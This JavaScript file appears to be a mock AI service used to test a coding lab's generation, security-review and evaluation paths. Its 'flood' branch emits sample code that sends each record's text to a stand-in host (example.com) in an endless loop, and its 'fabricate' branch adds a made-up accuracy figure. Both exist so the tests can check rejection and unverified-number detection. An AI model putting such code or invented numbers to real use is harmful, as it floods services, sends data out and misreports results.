// A stand-in for MetaCode's AI service (OpenAI-style /v1/chat/completions and
// /v1/models) for the AI Coding Lab tests. Answers depend on the system
// prompt, so a profile that asks for ES modules gets `export function add`
// and one that doesn't gets a plain function — enough to make evaluations,
// suggestions and comparisons measurable. Not a model: it proves MetaCode's
// own code paths, not any provider's behaviour.
//
// Code experiments (ai-lab/experiment-ai.js prompts, matched by their first line):
//   generation  code from the words of the <request> block, in the language of the
//               system prompt's "Language:" line: "flood" → a network-flooding
//               script, "loop forever" → an endless loop, "bad output" → unknown
//               code ids, "random" → a keyword rule that also uses randomness,
//               anything else → a keyword rule for the variable's codes
//   review      from the <code> block only: requests/socket/fetch/while True →
//               rejected, random → needs_review, else approved
//   evaluation  quotes numbers it finds in <measured_metrics> and
//               <comparison_counts>; "fabricate" anywhere in the request adds a
//               made-up number (for the unverified-numbers check)
//   questions   a fixed plain-text answer
const http = require('http');

const PLAIN = '```js\nfunction add(a, b) {\n  return a + b;\n}\n```';
const MODULE = '```js\nexport function add(a, b) {\n  return a + b;\n}\n```';

// The content of a prompt block <tag …>…</tag> (ai-lab/experiment-ai.js block())
function blockOf(text, tag) {
  const m = new RegExp('<' + tag + '(?:\\s[^>]*)?>\\n?([\\s\\S]*?)\\n?</' + tag + '>').exec(String(text || ''));
  return m ? m[1] : '';
}
const jsonBlock = (text, tag) => { try { return JSON.parse(blockOf(text, tag)); } catch (e) { return null; } };

// A keyword table for the variable's codes: each code's id and the words of its label
function keywordTable(codes) {
  const table = {};
  for (const c of codes) table[c.id] = Array.from(new Set([String(c.id).toLowerCase()].concat(String(c.label || '').toLowerCase().split(/[^a-z0-9]+/).filter(w => w.length >= 3))));
  return table;
}

function keywordRule(lang, codes, random) {
  const table = JSON.stringify(keywordTable(codes));
  if (lang === 'python') {
    return (random ? 'import random\n\n' : '') + '# Keyword rule: the first code whose id or label word appears in the text.\nKEYWORDS = ' + table + '\n\n' +
      'def classify(record, variable):\n' +
      (random ? '    jitter = random.random() * 0\n' : '') +
      '    text = str(record.get("text") or "").lower()\n' +
      '    for code in variable["codes"]:\n' +
      '        for word in KEYWORDS.get(code["id"], [code["id"].lower()]):\n' +
      '            if word in text:\n' +
      '                return {"code": code["id"], "confidence": 0.8, "reason": "mentions " + word}\n' +
      '    return None\n';
  }
  const ts = lang === 'typescript';
  return '// Keyword rule: the first code whose id or label word appears in the text.\n' +
    'const KEYWORDS' + (ts ? ': Record<string, string[]>' : '') + ' = ' + table + ';\n\n' +
    'function classify(record' + (ts ? ': { text: string }' : '') + ', variable' + (ts ? ': { codes: { id: string }[] }' : '') + ')' + (ts ? ': { code: string, confidence: number, reason: string } | null' : '') + ' {\n' +
    (random ? '  const jitter = Math.random() * 0;\n' : '') +
    '  const text = String(record.text || \'\').toLowerCase();\n' +
    '  for (const code of variable.codes) {\n' +
    '    const words = KEYWORDS[code.id] || [String(code.id).toLowerCase()];\n' +
    '    for (const word of words) {\n' +
    '      if (text.indexOf(word) !== -1) return { code: code.id, confidence: 0.8, reason: \'mentions \' + word };\n' +
    '    }\n' +
    '  }\n' +
    '  return null;\n' +
    '}\n';
}

function generationAnswer(sys, user) {
  const lang = (/^Language: (javascript|typescript|python)$/m.exec(sys) || [])[1] || 'javascript';
  const py = lang === 'python';
  const request = blockOf(user, 'request').toLowerCase();
  const variable = jsonBlock(user, 'variable');
  const codes = variable && Array.isArray(variable.codes) ? variable.codes
    : ((/^Codes \(return only these ids, or null\): (.*)$/m.exec(sys) || [])[1] || '').split(/,\s*/).filter(Boolean).map(id => ({ id, label: id }));
  let code, summary;
  if (/flood/.test(request)) {
    summary = 'Sends every record to a web service, over and over.';
    code = py
      ? 'import requests\nimport socket\n\ndef classify(record, variable):\n    while True:\n        requests.post("http://example.com/collect", data=record["text"])\n'
      : '// Sends each record to a web service, again and again.\nfunction classify(record, variable) {\n  while (true) {\n    fetch(\'http://example.com/collect?q=\' + encodeURIComponent(record.text));\n  }\n}\n';
  } else if (/loop forever/.test(request)) {
    summary = 'Waits for a code that never comes.';
    code = py ? 'def classify(record, variable):\n    n = 0\n    while True:\n        n += 1\n' : 'function classify(record, variable) {\n  let n = 0;\n  while (true) {\n    n++;\n  }\n}\n';
  } else if (/bad output/.test(request)) {
    summary = 'Returns a code that is not in the codebook.';
    code = py ? 'def classify(record, variable):\n    return {"code": "not_a_code", "confidence": 0.5}\n' : 'function classify(record, variable) {\n  return { code: \'not_a_code\', confidence: 0.5 };\n}\n';
  } else {
    const random = /random/.test(request);
    summary = 'Assigns the first code whose id or label appears in the text' + (random ? ', with a random tie-breaker' : '') + '.';
    code = keywordRule(lang, codes, random);
  }
  return JSON.stringify({ code: '```' + (py ? 'python' : lang) + '\n' + code + '```', summary, proposedImprovement: 'Codes records by keywords instead of reading them.',
    reasoning: 'Keywords are easy to check.', assumptions: ['Records mention their code by name.'], expectedTradeoffs: ['Misses paraphrases.'] });
}

function reviewAnswer(user) {
  const code = blockOf(user, 'code');
  const lines = code.split('\n');
  const at = re => { const i = lines.findIndex(l => re.test(l)); return i < 0 ? null : i + 1; };
  const excerpt = n => (n ? lines[n - 1].replace(/^\s*\d+\| /, '').trim() : '');
  if (/requests|socket|fetch|while True/.test(code)) {
    const line = at(/requests|socket|fetch|while True/);
    return JSON.stringify({ decision: 'rejected', risks: [{ category: 'network access of any kind', severity: 'critical', line, excerpt: excerpt(line), explanation: 'The code sends data over the network.' }],
      summary: 'The code makes network requests in a loop.', saferAlternative: 'Classify from the record text only.' });
  }
  if (/random/.test(code)) {
    const line = at(/random/);
    return JSON.stringify({ decision: 'needs_review', risks: [{ category: 'other', severity: 'low', line, excerpt: excerpt(line), explanation: 'Uses randomness, so results may not reproduce.' }],
      summary: 'Probably harmless, but uses randomness.', saferAlternative: 'Remove the random part.' });
  }
  return JSON.stringify({ decision: 'approved', risks: [], summary: 'The code only reads the record and returns a code.', saferAlternative: '' });
}

function evaluationAnswer(user) {
  const m = jsonBlock(user, 'measured_metrics');
  const counts = jsonBlock(user, 'comparison_counts');
  const parts = [];
  if (m) {
    parts.push('Coverage was ' + (m.coverage * 100).toFixed(1) + '% of ' + m.processed + ' records');
    const ref = m.reference && (m.reference.test || m.reference.all);
    if (ref && typeof ref.accuracy === 'number') parts.push('accuracy ' + (ref.accuracy * 100).toFixed(1) + '% (n=' + ref.n + ')');
  }
  let observed = (parts.join(', ') || 'Nothing was measured') + '.';
  if (/fabricate/i.test(user)) observed += ' It reached 12.3% accuracy on 7777 records.';
  return JSON.stringify({
    proposedImprovement: 'Code records by keywords.', reasoning: 'Keywords are easy to check.', observedResults: observed,
    comparison: counts ? counts.changed + ' records changed compared with the target.' : 'There was no comparison target.',
    tradeoffs: 'Keyword rules can miss paraphrases (a hypothesis, not measured).', limitations: 'Only the sandbox records were measured.', recommendation: 'retain'
  });
}

function answerFor(sys, user) {
  if (/^You write coding rules for MetaCode\./.test(sys)) return generationAnswer(sys, user);
  if (/^You review code for security before it runs\./.test(sys)) return reviewAnswer(user);
  if (/^You evaluate coding-rule experiments from measured results\./.test(sys)) return evaluationAnswer(user);
  if (/^You answer questions about a coding-rule experiment\./.test(sys)) return 'The rule gives each record the first code whose keyword appears in its text. (Nothing was run to answer this.)';
  if (/You improve the written instructions/.test(sys)) {
    return JSON.stringify({ summary: 'The tasks expect exported functions.', changes: [{ field: 'conventions', value: 'Use ES module exports: write `export function` for public functions.', reason: 'Every failure is a missing export.' }] });
  }
  if (/You grade answers/.test(sys)) return '{"score": 0.9, "reasons": "Meets the criteria."}';
  if (/Summarise this coding conversation/.test(sys)) return 'The user wants an add function; decided on plain JavaScript.';
  if (/ES module/.test(sys)) return 'Here it is:\n' + MODULE;
  return 'Here it is:\n' + PLAIN + (/slow/.test(user) ? '\n' + 'More text. '.repeat(40) : '');
}

// state: { requests: [], streamDelayMs: 0, fail: false } — read and changed by the tests
function startAiService(state) {
  const s = http.createServer((req, res) => {
    let body = '';
    req.on('data', c => { body += c; });
    req.on('end', async () => {
      if (req.url === '/v1/models') { res.setHeader('content-type', 'application/json'); return res.end(JSON.stringify({ data: [{ id: 'lab-model' }, { id: 'judge-model' }] })); }
      // (GET /v1/status and the like: not a chat, and not counted as one)
      if (req.url !== '/v1/chat/completions') { res.statusCode = 404; res.setHeader('content-type', 'application/json'); return res.end('{}'); }
      const j = JSON.parse(body || '{}');
      state.requests.push(j);
      if (state.fail) { res.statusCode = 503; res.setHeader('content-type', 'application/json'); return res.end('{"error":{"message":"down"}}'); }
      const sys = j.messages.filter(m => m.role === 'system').map(m => m.content).join('\n');
      const user = j.messages.filter(m => m.role === 'user').slice(-1)[0].content;
      const content = answerFor(sys, user);
      if (j.stream) {
        res.writeHead(200, { 'content-type': 'text/event-stream' });
        const parts = content.match(/[\s\S]{1,12}/g);
        for (const p of parts) {
          if (res.destroyed) return;
          res.write('data: ' + JSON.stringify({ model: j.model, choices: [{ index: 0, delta: { content: p } }] }) + '\n\n');
          if (state.streamDelayMs) await new Promise(r => setTimeout(r, state.streamDelayMs));
        }
        res.write('data: ' + JSON.stringify({ model: j.model, choices: [{ index: 0, delta: {}, finish_reason: 'stop' }], usage: { prompt_tokens: 111, completion_tokens: 22 } }) + '\n\n');
        res.write('data: [DONE]\n\n');
        return res.end();
      }
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ model: j.model, choices: [{ index: 0, message: { role: 'assistant', content }, finish_reason: 'stop' }], usage: { prompt_tokens: 100, completion_tokens: 20 } }));
    });
  });
  return new Promise(r => s.listen(0, '127.0.0.1', () => r(s)));
}

module.exports = { startAiService, answerFor, PLAIN, MODULE };
